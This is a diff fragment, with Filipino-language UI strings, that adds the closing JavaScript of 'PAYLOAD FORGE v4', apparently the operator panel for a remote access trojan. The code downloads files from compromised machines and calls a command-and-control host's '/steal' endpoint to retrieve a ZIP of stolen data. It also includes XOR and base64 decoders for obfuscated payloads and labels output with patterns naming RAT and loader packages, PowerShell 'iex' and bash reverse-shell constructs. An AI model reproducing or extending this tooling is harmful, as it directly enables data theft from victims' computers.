+  if(!b64||b64.startsWith('[err]')){alert('Hindi makuha: '+f);return}
+  const bin=atob(b64),arr=new Uint8Array(bin.length);
+  for(let i=0;i<bin.length;i++)arr[i]=bin.charCodeAt(i);
+  const name=f.split('/').pop().split('\\').pop()||'file';
+  saveBlob(new Blob([arr],{type:'application/octet-stream'}),name);
+ }).catch(e=>alert('❌ '+e));
+}
+function triggerSteal(){
+ if(!connected){alert('Hindi konektado.');return}
+ vlog('💾 Triggering data stealer...');
+ fetch(C2+'/steal?t='+Date.now()).then(r=>r.text()).then(t=>{
+  if(t&&t.length>50&&!t.startsWith('[err]')){
+   const bin=atob(t),arr=new Uint8Array(bin.length);
+   for(let i=0;i<bin.length;i++)arr[i]=bin.charCodeAt(i);
+   saveBlob(new Blob([arr],{type:'application/zip'}),'steal_'+Date.now()+'.zip');
+   vlog('✅ Stealer ZIP na-download ('+arr.length+' bytes).');
+   refreshFiles();
+  }else vlog('⚠ Walang result: '+t);
+ }).catch(e=>vlog('❌ '+e));
+}
+
+/* ============ Part 2-H · Decoder & Tools ============ */
+function detect(s){
+ s=s.trim();
+ if(s.startsWith('XORKEY:'))return{type:'xor',v:s.slice(7).trim()};
+ if(s.startsWith('BASE64:'))return{type:'b64',v:s.slice(7).trim()};
+ if(/S\("(\\u[0-9a-fA-F]{4})+\)"/.test(s))return{type:'mc',v:s};
+ return{type:'plain',v:s};
+}
+function decodeMC(s){
+ const m=s.match(/"((?:\\u[0-9a-fA-F]{4})+)"\)/);
+ if(!m)return s;
+ const re=/\\u([0-9a-fA-F]{4})/g;let x,bytes=[];
+ while((x=re.exec(m[1])))bytes.push(parseInt(x[1],16));
+ let o='';
+ for(let i=0;i<bytes.length;i++)o+=String.fromCharCode(bytes[i]^KEY.charCodeAt(i%KEY.length));
+ return o;
+}
+function doDecode(){
+ const raw=$('decIn').value;
+ if(!raw){$('decOut').value='Walang input.';return}
+ let out='';
+ raw.split('\n').forEach(line=>{
+  const d=detect(line);
+  if(d.type==='xor')out+='# XORKEY decoded:\n'+xorDecode(d.v)+'\n\n';
+  else if(d.type==='b64'){try{out+='# BASE64 decoded:\n'+ub64(d.v)+'\n\n'}catch(e){out+='# invalid base64: '+line+'\n'}}
+  else if(d.type==='mc')out+='# MC S() string decoded:\n'+decodeMC(d.v)+'\n\n';
+  else out+=line+'\n';
+ });
+ $('decOut').value=out.trim()||'(walang na-detect na encoded data)';
+}
+function doEncode(){
+ const raw=$('decIn').value;
+ if(!raw){$('decOut').value='Walang input.';return}
+ $('decOut').value='XORKEY:'+xorEncode(raw);
+}
+function copyDec(){copyText($('decOut').value,null)}
+function downloadDec(){
+ const t=$('decOut').value;
+ if(!t){alert('Walang result.');return}
+ let ext='.txt';
+ if(/^import |^from |^def |print\(/.test(t))ext='.py';
+ else if(/iex |\$ErrorActionPreference|Get-CimInstance/.test(t))ext='.ps1';
+ else if(/^#!\/bin\/bash|exec 3<>/.test(t))ext='.sh';
+ else if(/package rat;|package loader;|extends JavaPlugin/.test(t))ext='.java';
+ else if(/<!DOCTYPE html>/i.test(t))ext='.html';
+ saveBlob(new Blob([t],{type:'text/plain'}),'decoded'+ext);
+}
+
+/* ============ INIT ============ */
+(function init(){
+ updateUI();
+ $('fileChips').innerHTML='';
+})();
+/* ==== END — kumpleto na ang PAYLOAD FORGE v4 ==== */
+</script>
+</body>
+</html>
